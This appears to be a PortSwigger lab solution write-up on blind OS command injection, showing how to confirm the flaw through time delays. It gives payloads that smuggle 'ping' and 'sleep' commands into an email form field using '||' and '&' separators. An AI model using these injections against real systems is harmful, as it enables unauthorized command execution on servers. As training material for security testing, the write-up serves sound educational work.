## Lab Description:

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/6bc8b48c-8ac2-4bff-adad-b947cafc1081)

## Solution:

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/ef93108c-cddd-4882-93ae-2116d15d8cc8)
```sql
email=jay%40gmail.com||ping+-c+10+127.0.0.1||
```
with ping command we can delay the response by 10 seconds
![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/113502bb-c43a-4304-833e-b4f673dd005f)
```sql
email=jay%40gmail.com||sleep+10||
```
By adding the & sleep # (Note the space before & and after #) / & sleep 10 &(URL-encode before sending) , we can see that the email parameter is vulnerable to command injection vulnerability, since there was time delay of 10 seconds.
![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e0fb81c6-d282-4467-8a68-b6a85673aff5)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/1b5dd773-8a9f-4a30-a5f2-bb2ad9e5fa1d)
